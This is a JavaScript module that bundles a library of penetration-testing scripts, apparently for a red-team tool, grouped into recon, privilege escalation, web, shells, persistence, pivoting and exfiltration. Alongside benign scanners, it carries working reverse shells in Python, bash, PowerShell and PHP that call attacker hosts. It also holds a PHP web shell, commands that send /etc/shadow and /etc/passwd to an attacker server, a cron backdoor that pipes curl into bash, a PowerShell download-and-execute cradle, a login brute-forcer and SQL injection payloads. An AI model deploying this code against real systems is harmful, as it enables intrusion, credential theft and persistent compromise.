// Built-in script collection — real, useful scripts organized by category
const builtinScripts = [
  {
    id: 'recon-nmap-quick',
    name: 'nmap-quick.sh',
    category: 'Recon',
    language: 'bash',
    description: 'Quick nmap scan — top 1000 ports with service detection',
    content: `#!/bin/bash
# Quick nmap scan with service detection
# Usage: ./nmap-quick.sh <target>

if [ -z "$1" ]; then
  echo "Usage: $0 <target>"
  exit 1
fi

TARGET="$1"
OUTPUT="nmap_\${TARGET}_$(date +%Y%m%d_%H%M%S)"

echo "[*] Running quick scan on $TARGET..."
nmap -sC -sV -oA "$OUTPUT" "$TARGET"

echo "[*] Results saved to $OUTPUT.*"
echo "[*] Quick open ports:"
grep "open" "\${OUTPUT}.nmap" | grep -v "^#"`,
  },
  {
    id: 'recon-nmap-full',
    name: 'nmap-full.sh',
    category: 'Recon',
    language: 'bash',
    description: 'Full nmap scan — all 65535 ports, aggressive detection',
    content: `#!/bin/bash
# Full port scan with aggressive service/OS detection
# Usage: ./nmap-full.sh <target>

if [ -z "$1" ]; then
  echo "Usage: $0 <target>"
  exit 1
fi

TARGET="$1"
OUTPUT="nmap_full_\${TARGET}_$(date +%Y%m%d_%H%M%S)"

echo "[*] Phase 1: All-port scan on $TARGET..."
nmap -p- --min-rate=1000 -T4 -oG "\${OUTPUT}_allports.gnmap" "$TARGET"

PORTS=$(grep -oP '\\d+/open' "\${OUTPUT}_allports.gnmap" | awk -F/ '{print $1}' | tr '\\n' ',' | sed 's/,$//')

echo "[*] Phase 2: Service scan on open ports: $PORTS"
nmap -sC -sV -O -p"$PORTS" -oA "$OUTPUT" "$TARGET"

echo "[*] Done. Results in $OUTPUT.*"`,
  },
  {
    id: 'recon-subdomain',
    name: 'subdomain-enum.sh',
    category: 'Recon',
    language: 'bash',
    description: 'Subdomain enumeration using multiple sources',
    content: `#!/bin/bash
# Subdomain enumeration using crt.sh + subfinder + amass
# Usage: ./subdomain-enum.sh <domain>

DOMAIN="$1"
if [ -z "$DOMAIN" ]; then
  echo "Usage: $0 <domain>"
  exit 1
fi

OUT="subdomains_\${DOMAIN}_$(date +%Y%m%d)"
mkdir -p "$OUT"

echo "[*] Querying crt.sh..."
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" | jq -r '.[].name_value' | sort -u > "\${OUT}/crtsh.txt"
echo "    Found $(wc -l < "\${OUT}/crtsh.txt") from crt.sh"

if command -v subfinder &>/dev/null; then
  echo "[*] Running subfinder..."
  subfinder -d "$DOMAIN" -silent > "\${OUT}/subfinder.txt"
  echo "    Found $(wc -l < "\${OUT}/subfinder.txt") from subfinder"
fi

cat "\${OUT}"/*.txt | sort -u > "\${OUT}/all_subdomains.txt"
echo "[*] Total unique subdomains: $(wc -l < "\${OUT}/all_subdomains.txt")"`,
  },
  {
    id: 'privesc-linpeas',
    name: 'linpeas-runner.sh',
    category: 'PrivEsc',
    language: 'bash',
    description: 'Download and run LinPEAS for Linux privilege escalation',
    content: `#!/bin/bash
# LinPEAS runner — downloads and executes the latest version
# Run on target machine

echo "[*] Downloading LinPEAS..."
curl -fsSL "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh

echo "[*] Running LinPEAS (output saved to /tmp/linpeas_out.txt)..."
/tmp/linpeas.sh -a 2>&1 | tee /tmp/linpeas_out.txt

echo "[*] Done. Review /tmp/linpeas_out.txt"`,
  },
  {
    id: 'privesc-suid',
    name: 'find-suid.sh',
    category: 'PrivEsc',
    language: 'bash',
    description: 'Find SUID/SGID binaries and world-writable files',
    content: `#!/bin/bash
# Find potentially exploitable SUID/SGID binaries and world-writable files

echo "=== SUID Binaries ==="
find / -perm -4000 -type f 2>/dev/null | while read f; do
  ls -la "$f"
done

echo ""
echo "=== SGID Binaries ==="
find / -perm -2000 -type f 2>/dev/null | while read f; do
  ls -la "$f"
done

echo ""
echo "=== World-Writable Directories ==="
find / -writable -type d 2>/dev/null | grep -v proc

echo ""
echo "=== Cron Jobs ==="
ls -la /etc/cron* 2>/dev/null
cat /etc/crontab 2>/dev/null

echo ""
echo "=== Interesting Files ==="
find / -name "*.bak" -o -name "*.old" -o -name "*.conf" -o -name "*.cfg" 2>/dev/null | head -50`,
  },
  {
    id: 'web-dirscan',
    name: 'dir-brute.sh',
    category: 'Web',
    language: 'bash',
    description: 'Directory bruteforce with gobuster/feroxbuster',
    content: `#!/bin/bash
# Directory bruteforce — uses gobuster or feroxbuster
# Usage: ./dir-brute.sh <url> [wordlist]

URL="$1"
WORDLIST="\${2:-/usr/share/wordlists/dirb/common.txt}"

if [ -z "$URL" ]; then
  echo "Usage: $0 <url> [wordlist]"
  exit 1
fi

if command -v feroxbuster &>/dev/null; then
  echo "[*] Using feroxbuster on $URL"
  feroxbuster -u "$URL" -w "$WORDLIST" -t 50 --auto-tune -o "ferox_$(date +%H%M%S).txt"
elif command -v gobuster &>/dev/null; then
  echo "[*] Using gobuster on $URL"
  gobuster dir -u "$URL" -w "$WORDLIST" -t 50 -o "gobuster_$(date +%H%M%S).txt" --no-error
else
  echo "[!] Neither feroxbuster nor gobuster found. Install one:"
  echo "    sudo apt install gobuster"
  echo "    cargo install feroxbuster"
fi`,
  },
  {
    id: 'web-sqli-test',
    name: 'sqli-basic.py',
    category: 'Web',
    language: 'python',
    description: 'Basic SQL injection tester with common payloads',
    content: `#!/usr/bin/env python3
"""Basic SQL injection tester — tests common payloads against a URL parameter."""

import requests
import sys
import urllib3
urllib3.disable_warnings()

PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'/*",
    "1' ORDER BY 1--+",
    "1' ORDER BY 10--+",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 AND 1=1",
    "1 AND 1=2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "admin'--",
    "' OR 1=1#",
    "') OR ('1'='1",
]

ERROR_SIGNATURES = [
    "sql syntax", "mysql", "postgresql", "sqlite",
    "oracle", "mssql", "unclosed quotation",
    "quoted string not properly terminated",
    "warning:", "error in your sql",
]

def test_sqli(url, param):
    print(f"[*] Testing {url} param={param}")
    print(f"[*] {len(PAYLOADS)} payloads\\n")
    
    baseline = requests.get(url, verify=False).text
    
    for i, payload in enumerate(PAYLOADS, 1):
        try:
            sep = '&' if '?' in url else '?'
            test_url = f"{url}{sep}{param}={payload}"
            r = requests.get(test_url, verify=False, timeout=10)
            
            diff = abs(len(r.text) - len(baseline))
            errors = [s for s in ERROR_SIGNATURES if s in r.text.lower()]
            
            status = "⚠️ " if errors or diff > 500 else "  "
            print(f"  {status}[{i:02d}] {payload}")
            if errors:
                print(f"       └─ SQL error detected: {', '.join(errors)}")
            if diff > 500:
                print(f"       └─ Response length diff: {diff} bytes")
        except Exception as e:
            print(f"  ❌ [{i:02d}] {payload} — {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <param>")
        print(f"Example: {sys.argv[0]} http://target.com/page.php id")
        sys.exit(1)
    test_sqli(sys.argv[1], sys.argv[2])`,
  },
  {
    id: 'net-portscan',
    name: 'portscan.py',
    category: 'Network',
    language: 'python',
    description: 'Multi-threaded Python port scanner',
    content: `#!/usr/bin/env python3
"""Multi-threaded port scanner — no external dependencies."""

import socket
import sys
import threading
from queue import Queue
from datetime import datetime

open_ports = []
lock = threading.Lock()

def scan_port(target, port, timeout):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        if result == 0:
            try:
                banner = sock.recv(1024).decode().strip()
            except:
                banner = ""
            with lock:
                open_ports.append((port, banner))
        sock.close()
    except:
        pass

def worker(target, timeout, queue):
    while not queue.empty():
        port = queue.get()
        scan_port(target, port, timeout)
        queue.task_done()

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [start_port] [end_port] [threads]")
        sys.exit(1)

    target = sys.argv[1]
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    end = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
    threads = int(sys.argv[4]) if len(sys.argv) > 4 else 100

    print(f"[*] Scanning {target} ports {start}-{end} ({threads} threads)")
    print(f"[*] Started: {datetime.now().strftime('%H:%M:%S')}")

    queue = Queue()
    for port in range(start, end + 1):
        queue.put(port)

    thread_list = []
    for _ in range(min(threads, end - start + 1)):
        t = threading.Thread(target=worker, args=(target, 1, queue))
        t.daemon = True
        t.start()
        thread_list.append(t)

    queue.join()

    open_ports.sort()
    print(f"\\n[*] {len(open_ports)} open ports found:")
    for port, banner in open_ports:
        b = f" — {banner}" if banner else ""
        print(f"    {port}/tcp  open{b}")
    print(f"[*] Finished: {datetime.now().strftime('%H:%M:%S')}")

if __name__ == "__main__":
    main()`,
  },
  {
    id: 'net-http-server',
    name: 'http-server.py',
    category: 'Network',
    language: 'python',
    description: 'Quick HTTP file server with upload support',
    content: `#!/usr/bin/env python3
"""Quick HTTP file server with upload support for file transfers."""

import http.server
import os
import sys
import cgi

class UploadHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
        if ctype == 'multipart/form-data':
            pdict['boundary'] = bytes(pdict['boundary'], 'utf-8')
            fields = cgi.parse_multipart(self.rfile, pdict)
            for name, data in fields.items():
                filename = name
                with open(filename, 'wb') as f:
                    f.write(data[0] if isinstance(data[0], bytes) else data[0].encode())
                print(f"[+] Uploaded: {filename} ({len(data[0])} bytes)")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Upload OK")
        else:
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)
            filename = self.path.lstrip('/')
            with open(filename, 'wb') as f:
                f.write(body)
            print(f"[+] Received: {filename} ({len(body)} bytes)")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")

    def log_message(self, format, *args):
        print(f"[{self.client_address[0]}] {format % args}")

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
    directory = sys.argv[2] if len(sys.argv) > 2 else '.'
    os.chdir(directory)
    server = http.server.HTTPServer(('0.0.0.0', port), UploadHandler)
    print(f"[*] Serving {os.getcwd()} on 0.0.0.0:{port}")
    print(f"[*] Upload: curl -X POST http://<ip>:{port}/filename -d @file")
    server.serve_forever()`,
  },
  {
    id: 'crypto-xor',
    name: 'xor-cipher.py',
    category: 'Crypto',
    language: 'python',
    description: 'XOR cipher with single-byte key brute-force',
    content: `#!/usr/bin/env python3
"""XOR cipher — encrypt/decrypt with brute-force single-byte key analysis."""

import sys
from collections import Counter

ENGLISH_FREQ = {
    'e': 12.7, 't': 9.1, 'a': 8.2, 'o': 7.5, 'i': 7.0,
    'n': 6.7, 's': 6.3, 'h': 6.1, 'r': 6.0, 'd': 4.3,
    'l': 4.0, 'c': 2.8, 'u': 2.8, 'm': 2.4, 'w': 2.4,
}

def xor_bytes(data, key):
    if isinstance(key, int):
        return bytes([b ^ key for b in data])
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def score_english(text):
    try:
        decoded = text.decode('ascii', errors='ignore').lower()
    except:
        return 0
    score = 0
    for char in decoded:
        if char in ENGLISH_FREQ:
            score += ENGLISH_FREQ[char]
        elif char == ' ':
            score += 13
        elif char.isalpha():
            score += 1
        elif not char.isprintable():
            score -= 10
    return score

def brute_single_byte(ciphertext):
    results = []
    for key in range(256):
        plain = xor_bytes(ciphertext, key)
        score = score_english(plain)
        results.append((score, key, plain))
    results.sort(reverse=True)
    return results[:10]

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} brute <hex_string>     — brute-force single-byte key")
        print(f"  {sys.argv[0]} xor <hex_string> <key>  — XOR with key (hex)")
        sys.exit(1)

    mode = sys.argv[1]
    if mode == "brute":
        data = bytes.fromhex(sys.argv[2])
        print(f"[*] Brute-forcing {len(data)} bytes...\\n")
        for score, key, plain in brute_single_byte(data):
            preview = plain[:80].decode('ascii', errors='replace')
            print(f"  Key=0x{key:02x} ({key:3d}) Score={score:6.1f}  {preview}")
    elif mode == "xor":
        data = bytes.fromhex(sys.argv[2])
        key = bytes.fromhex(sys.argv[3])
        result = xor_bytes(data, key)
        print(result.hex())`,
  },
  {
    id: 'misc-spawn-tty',
    name: 'upgrade-shell.md',
    category: 'Misc',
    language: 'markdown',
    description: 'Shell upgrade techniques — dumb shell to full TTY',
    content: `# Shell Upgrade Cheatsheet

## Python PTY spawn
\`\`\`bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
\`\`\`

## Script method
\`\`\`bash
script /dev/null -c bash
\`\`\`

## Full TTY upgrade (after Python PTY)
\`\`\`bash
# In reverse shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
# In your terminal:
stty raw -echo; fg
# Back in reverse shell:
export TERM=xterm-256color
stty rows 50 cols 200
\`\`\`

## socat full TTY
\`\`\`bash
# Attacker:
socat file:\\\`tty\\\`,raw,echo=0 tcp-listen:4444

# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.1:4444
\`\`\`

## rlwrap (readline wrapper)
\`\`\`bash
rlwrap nc -lvnp 4444
\`\`\``,
  },
  {
    id: 'misc-exfil',
    name: 'exfiltration.md',
    category: 'Misc',
    language: 'markdown',
    description: 'Data exfiltration techniques reference',
    content: `# Exfiltration Techniques

## HTTP (Python server on attacker)
\`\`\`bash
# Attacker:
python3 -m http.server 8000

# Target — download:
curl http://ATTACKER:8000/file -o /tmp/file
wget http://ATTACKER:8000/file -O /tmp/file
\`\`\`

## HTTP upload (to attacker)
\`\`\`bash
# Attacker (use http-server.py with upload):
python3 http-server.py 8000

# Target:
curl -X POST http://ATTACKER:8000/loot.txt -d @/etc/passwd
\`\`\`

## Netcat
\`\`\`bash
# Attacker:
nc -lvnp 9999 > received_file

# Target:
nc ATTACKER 9999 < /etc/shadow
\`\`\`

## Base64 (over any text channel)
\`\`\`bash
# Target:
base64 -w0 /etc/shadow

# Attacker (decode):
echo "BASE64STRING" | base64 -d > shadow
\`\`\`

## DNS exfil (slow but stealthy)
\`\`\`bash
# Encode data into DNS queries:
cat /etc/passwd | xxd -p | fold -w 60 | while read line; do
  nslookup $line.exfil.attacker.com
done
\`\`\`

## SCP / SSH
\`\`\`bash
scp /etc/passwd user@ATTACKER:/tmp/passwd
\`\`\``,
  },
  {
    id: 'xfer-python-http-listing',
    name: 'python-http-listing.sh',
    category: 'Transfer',
    language: 'bash',
    description: 'One-liner Python 3 HTTP server with directory listing enabled',
    content: `#!/usr/bin/env bash
# Python 3 built-in server — directory listing is ON by default
# Usage: ./python-http-listing.sh [port] [directory]
PORT="\${1:-8000}"
DIR="\${2:-.}"
echo "[*] Serving $DIR on 0.0.0.0:$PORT (listing enabled)"
cd "$DIR" && python3 -m http.server "$PORT" --bind 0.0.0.0`,
  },
  {
    id: 'shell-python-reverse',
    name: 'reverse-shell.py',
    category: 'Shells',
    language: 'python',
    description: 'Full TCP reverse shell — connect back to attacker',
    content: `#!/usr/bin/env python3
"""Reverse TCP shell — run on target; catch with: nc -lvnp PORT"""
import socket, subprocess, os, sys

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} LHOST LPORT", file=sys.stderr)
        sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])

if __name__ == "__main__":
    main()`,
  },
  {
    id: 'shell-bash-reverse-variants',
    name: 'reverse-shells-bash.sh',
    category: 'Shells',
    language: 'bash',
    description: 'Several bash/tcp reverse one-liners — pick what exists on target',
    content: `#!/usr/bin/env bash
# Replace ATTACKER and PORT. Listener: nc -lvnp PORT

# Bash /dev/tcp (no external tools)
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# mkfifo + nc style
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER PORT > /tmp/f

# nc with exec (if nc exists)
nc -e /bin/bash ATTACKER PORT
# BusyBox / some nc builds:
# rm /tmp/p; mknod /tmp/p p && nc ATTACKER PORT 0/tmp/p`,
  },
  {
    id: 'shell-powershell-reverse',
    name: 'reverse-shell.ps1',
    category: 'Shells',
    language: 'powershell',
    description: 'PowerShell reverse shell with common execution-policy bypass',
    content: `# Run: powershell -nop -ep bypass -f reverse-shell.ps1
# Or one-liner wrapper:
# powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/rev.ps1')"

param(
  [string]$IP = "10.10.14.5",
  [int]$Port = 4444
)

$client = New-Object System.Net.Sockets.TCPClient($IP, $Port)
$stream = $client.GetStream()
[byte[]]$buf = 0..65535|%{0}
while (($i = $stream.Read($buf, 0, $buf.Length)) -ne 0) {
  $data = (New-Object Text.UTF8Encoding).GetString($buf,0,$i)
  try { $send = (iex $data 2>&1 | Out-String) } catch { $send = "$_\`n" }
  $reply = ([text.encoding]::UTF8).GetBytes($send)
  $stream.Write($reply,0,$reply.Length)
  $stream.Flush()
}
$client.Close()`,
  },
  {
    id: 'web-php-webshell',
    name: 'webshell-min.php',
    category: 'Web',
    language: 'php',
    description: 'Minimal PHP command execution via ?c= (authorized testing only)',
    content: `<?php
// Usage: curl "http://target/s.php?c=id"
// Remove immediately after lab use.
if (isset($_GET['c'])) {
    header('Content-Type: text/plain');
    system($_GET['c']);
}`,
  },
  {
    id: 'shell-php-reverse',
    name: 'reverse-shell.php',
    category: 'Shells',
    language: 'php',
    description: 'Simplified pentest-style PHP reverse shell',
    content: `<?php
// Listener: nc -lvnp 4444
$ip = '10.10.14.5';
$port = 4444;
$s = @fsockopen($ip, $port, $errno, $errstr, 30);
if (!$s) { die("connect failed"); }
proc_open('/bin/sh -i', array(0 => $s, 1 => $s, 2 => $s), $pipes);
// Windows: proc_open('cmd.exe', array(0 => $s, 1 => $s, 2 => $s), $pipes);
?>`,
  },
  {
    id: 'recon-portscan-threaded',
    name: 'portscan-threaded.py',
    category: 'Recon',
    language: 'python',
    description: 'Fast threaded TCP port scanner with argparse',
    content: `#!/usr/bin/env python3
import argparse, socket, threading
from queue import Queue

def scan(host, port, timeout, open_ports, lock):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        if s.connect_ex((host, port)) == 0:
            with lock:
                open_ports.append(port)
        s.close()
    except Exception:
        pass

def main():
    p = argparse.ArgumentParser()
    p.add_argument("host")
    p.add_argument("-p", "--ports", default="1-1024", help="e.g. 22,80,443 or 1-65535")
    p.add_argument("-t", "--threads", type=int, default=150)
    p.add_argument("--timeout", type=float, default=0.5)
    args = p.parse_args()

    ports = []
    if "-" in args.ports and "," not in args.ports:
        a, b = map(int, args.ports.split("-", 1))
        ports = list(range(a, b + 1))
    else:
        ports = [int(x) for x in args.ports.split(",")]

    open_ports, lock = [], threading.Lock()
    q = Queue()
    for port in ports:
        q.put(port)

    def worker():
        while True:
            try:
                port = q.get_nowait()
            except Exception:
                return
            scan(args.host, port, args.timeout, open_ports, lock)
            q.task_done()

    threads = [threading.Thread(target=worker) for _ in range(min(args.threads, len(ports)))]
    for t in threads:
        t.daemon = True
        t.start()
    for t in threads:
        t.join()

    print("[*] Open:", sorted(open_ports))

if __name__ == "__main__":
    main()`,
  },
  {
    id: 'recon-ping-sweep',
    name: 'ping-sweep.sh',
    category: 'Recon',
    language: 'bash',
    description: 'Ping sweep a /24 (bash + ping)',
    content: `#!/usr/bin/env bash
# Usage: ./ping-sweep.sh 192.168.1
# Scans 192.168.1.1 - 192.168.1.254
PREFIX="\${1:?Usage: $0 10.10.10}"
for i in $(seq 1 254); do
  ip="$PREFIX.$i"
  ping -c 1 -W 1 "$ip" &>/dev/null && echo "[+] $ip is up" &
done
wait
echo "[*] Done"`,
  },
  {
    id: 'recon-subdomain-brute-py',
    name: 'subdomain-brute.py',
    category: 'Recon',
    language: 'python',
    description: 'Simple DNS subdomain brute force (no deps)',
    content: `#!/usr/bin/env python3
"""Subdomain brute — wordlist + DNS A lookup."""
import sys, socket

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} domain wordlist.txt", file=sys.stderr)
        sys.exit(1)
    domain, wl = sys.argv[1], sys.argv[2]
    with open(wl, encoding="utf-8", errors="ignore") as f:
        words = [w.strip() for w in f if w.strip()]
    for w in words:
        host = f"{w}.{domain}"
        try:
            socket.getaddrinfo(host, None)
            print(f"[+] {host}")
        except socket.gaierror:
            pass

if __name__ == "__main__":
    main()`,
  },
  {
    id: 'recon-nmap-automation',
    name: 'nmap-full-auto.sh',
    category: 'Recon',
    language: 'bash',
    description: 'Phased nmap: discovery, all TCP ports, then deep service scan',
    content: `#!/usr/bin/env bash
set -euo pipefail
TARGET="\${1:?Usage: $0 <target>}"
OUT="nmap_auto_\${TARGET}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUT"

echo "[1] Ping / discovery"
nmap -sn "$TARGET" -oN "$OUT/01_discovery.nmap"

echo "[2] All TCP ports (fast)"
nmap -p- --min-rate=2000 -T4 -Pn "$TARGET" -oG "$OUT/02_alltcp.gnmap"

PORTS=$(grep -oP '\\d+/open' "$OUT/02_alltcp.gnmap" 2>/dev/null | cut -d/ -f1 | paste -sd, -)
if [[ -z "$PORTS" ]]; then
  echo "[!] No open TCP ports found"
  exit 0
fi

echo "[3] Service + scripts on: $PORTS"
nmap -Pn -sC -sV -sT -p"$PORTS" -T4 -oA "$OUT/03_detail" "$TARGET"

echo "[*] Outputs in $OUT/"`,
  },
  {
    id: 'privesc-linpeas-download',
    name: 'linpeas-download-run.sh',
    category: 'PrivEsc',
    language: 'bash',
    description: 'Download LinPEAS from GitHub release and execute',
    content: `#!/usr/bin/env bash
# LinPEAS — download + run (PEASS-ng releases)
set -e
URL="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
OUT="/tmp/linpeas_$$.sh"
echo "[*] Fetching LinPEAS..."
curl -fsSL "$URL" -o "$OUT"
chmod +x "$OUT"
echo "[*] Running (tee to linpeas.out)..."
"$OUT" | tee /tmp/linpeas.out
echo "[*] Done. Log: /tmp/linpeas.out"`,
  },
  {
    id: 'privesc-winpeas-download',
    name: 'winpeas-download-run.ps1',
    category: 'PrivEsc',
    language: 'powershell',
    description: 'Download WinPEAS x64 and run (quiet mode)',
    content: `# WinPEAS x64 — download + execute
$Url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe"
$Path = "$env:TEMP\\winpeas.exe"
Write-Host "[*] Downloading WinPEAS..."
Invoke-WebRequest -Uri $Url -OutFile $Path
Write-Host "[*] Running (quiet cmd mode)..."
& $Path quiet cmd
Write-Host "[*] Finished"`,
  },
  {
    id: 'crypto-ssh-keygen',
    name: 'ssh-keygen-helper.sh',
    category: 'Misc',
    language: 'bash',
    description: 'Generate ed25519 SSH keypair and show public key',
    content: `#!/usr/bin/env bash
# Generate SSH key for pivot / persistence (authorized_keys)
KEY="\${1:-$HOME/.ssh/slimeshell_pivot}"
mkdir -p "$(dirname "$KEY")"
ssh-keygen -t ed25519 -f "$KEY" -N "" -C "slimeshell-$(hostname)-$(date +%Y%m%d)"
echo ""
echo "[*] Private: $KEY"
echo "[*] Public (paste into authorized_keys):"
cat "$KEY.pub"`,
  },
  {
    id: 'crypto-hashcat-cheatsheet',
    name: 'hashcat-commands.sh',
    category: 'Crypto',
    language: 'bash',
    description: 'Common hashcat mode examples (reference / copy-paste)',
    content: `#!/usr/bin/env bash
# Hashcat quick reference — edit hashes/files then uncomment

# MD5
# hashcat -m 0 hashes.txt wordlist.txt

# SHA256
# hashcat -m 1400 hashes.txt wordlist.txt

# NTLM
# hashcat -m 1000 ntlm.txt wordlist.txt

# NetNTLMv2 (Responder format)
# hashcat -m 5600 netntlmv2.txt wordlist.txt

# Kerberos 5 TGS-REP (krb5tgs / kerberoast)
# hashcat -m 13100 krb.txt wordlist.txt

# bcrypt
# hashcat -m 3200 bcrypt.txt wordlist.txt

# WPA/WPA2 PMKID / hccapx
# hashcat -m 22000 handshake.hc22000 wordlist.txt

# Rules
# hashcat -m 1000 ntlm.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Benchmark
# hashcat -b

echo "[*] Edit this script and uncomment the lines you need."`,
  },
  {
    id: 'exploit-msf-resource',
    name: 'handler.rc',
    category: 'Exploit',
    language: 'bash',
    description: 'Metasploit resource script — handler + common prep',
    content: `# Usage: msfconsole -r handler.rc
# Adjust LHOST / LPORT / PAYLOAD

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
set ExitOnSession false
set EnableStageEncoding true
exploit -j

# use post/windows/manage/migrate
# set SESSION 1
# run`,
  },
  {
    id: 'exfil-python-dns-http',
    name: 'exfil-dns-http.py',
    category: 'Misc',
    language: 'python',
    description: 'Chunk file to DNS labels or POST over HTTP (lab exfil patterns)',
    content: `#!/usr/bin/env python3
"""Exfil helpers — authorized testing only."""
import sys, base64, urllib.request

def dns_chunks(path, label_max=60):
    raw = open(path, "rb").read()
    b64 = base64.b64encode(raw).decode().replace("+", "-").replace("/", "_").rstrip("=")
    for i in range(0, len(b64), label_max):
        chunk = b64[i : i + label_max]
        print(f"# nslookup {chunk}.exfil.example.com")

def http_post(url, path):
    data = open(path, "rb").read()
    req = urllib.request.Request(url, data=data, method="POST")
    urllib.request.urlopen(req, timeout=30)
    print("[+] POST OK", url)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} dns <file> | http <url> <file>")
        sys.exit(1)
    if sys.argv[1] == "dns":
        dns_chunks(sys.argv[2])
    elif sys.argv[1] == "http":
        http_post(sys.argv[2], sys.argv[3])
    else:
        sys.exit(1)`,
  },
  {
    id: 'persist-cron-bash',
    name: 'persistence-cron.sh',
    category: 'Persistence',
    language: 'bash',
    description: 'Add cron backdoor line (lab / red-team with authorization)',
    content: `#!/usr/bin/env bash
# WARNING: Only use on systems you own or have explicit written permission.
# Adds a reverse shell cron (every reboot + hourly example)

PAYLOAD='* * * * * curl -fsSL http://10.10.14.5/rev.sh | bash'
# Or: @reboot /bin/bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"

(crontab -l 2>/dev/null; echo "$PAYLOAD") | crontab -
echo "[*] crontab -l:"
crontab -l`,
  },
  {
    id: 'enum-powershell-system',
    name: 'enum-system.ps1',
    category: 'Recon',
    language: 'powershell',
    description: 'Gather OS, user, network, hotfixes, AV (quick triage)',
    content: `# Quick Windows enumeration
Write-Host "=== OS ==="
Get-ComputerInfo | Select-Object WindowsProductName, OsVersion, OsArchitecture

Write-Host "\`n=== User / priv ==="
whoami /all

Write-Host "\`n=== Network ==="
Get-NetIPAddress -AddressFamily IPv4 | Format-Table
Get-NetTCPConnection -State Listen | Select-Object -First 20 LocalAddress, LocalPort, OwningProcess

Write-Host "\`n=== Hotfixes (sample) ==="
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 10

Write-Host "\`n=== Scheduled tasks (top) ==="
Get-ScheduledTask | Where-Object State -eq Running | Select-Object -First 15 TaskName`,
  },
  {
    id: 'web-http-brute-py',
    name: 'http-login-brute.py',
    category: 'Web',
    language: 'python',
    description: 'Simple HTTP POST login brute for one user (requests)',
    content: `#!/usr/bin/env python3
"""Basic HTTP login brute — customize DATA_TEMPLATE."""
import sys, requests
urllib3 = __import__("urllib3")
urllib3.disable_warnings()

def main():
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <url> <user> <password_list>", file=sys.stderr)
        sys.exit(1)
    url, user, plist = sys.argv[1], sys.argv[2], sys.argv[3]
    with open(plist, encoding="utf-8", errors="ignore") as f:
        passwords = [l.strip() for l in f if l.strip()]
    for pwd in passwords:
        # TODO: adjust fields to target app
        r = requests.post(
            url,
            data={"username": user, "password": pwd},
            verify=False,
            timeout=15,
            allow_redirects=False,
        )
        ok = r.status_code in (302, 301) and "login" not in r.headers.get("Location", "").lower()
        if r.status_code == 200 and "Welcome" in r.text:
            ok = True
        tag = "HIT" if ok else "miss"
        print(f"[{tag}] {pwd[:40]}... status={r.status_code}")

if __name__ == "__main__":
    main()`,
  },
  {
    id: 'pivot-chisel-setup',
    name: 'chisel-setup.sh',
    category: 'Pivot',
    language: 'bash',
    description: 'Attacker chisel server + example client reverse SOCKS one-liners',
    content: `#!/usr/bin/env bash
# Chisel pivot cheat-automation — set ATTACKER_IP

ATTACKER_IP="\${ATTACKER_IP:-10.10.14.5}"
CHISEL_PORT=8000

echo "[*] On ATTACKER ($ATTACKER_IP), run:"
echo "    ./chisel server -p $CHISEL_PORT --reverse"
echo ""
echo "[*] On compromised host (outbound HTTP to you), reverse SOCKS:"
echo "    ./chisel client http://$ATTACKER_IP:$CHISEL_PORT R:socks"
echo ""
echo "[*] Then proxychains.conf:"
echo "    socks5 127.0.0.1 1080"
echo ""
echo "[*] Forward single port example (RDP 3389 internal):"
echo "    ./chisel client http://$ATTACKER_IP:$CHISEL_PORT R:13389:10.0.0.5:3389"
echo "    # rdesktop 127.0.0.1:13389"`,
  },
];

const categories = [...new Set(builtinScripts.map(s => s.category))];

const languageColors = {
  bash: '#6EE7B7',
  python: '#A78BFA',
  javascript: '#FBBF24',
  markdown: '#7DD3FC',
  powershell: '#7DD3FC',
  ruby: '#F472B6',
  php: '#8892BF',
};

export { builtinScripts, categories, languageColors };
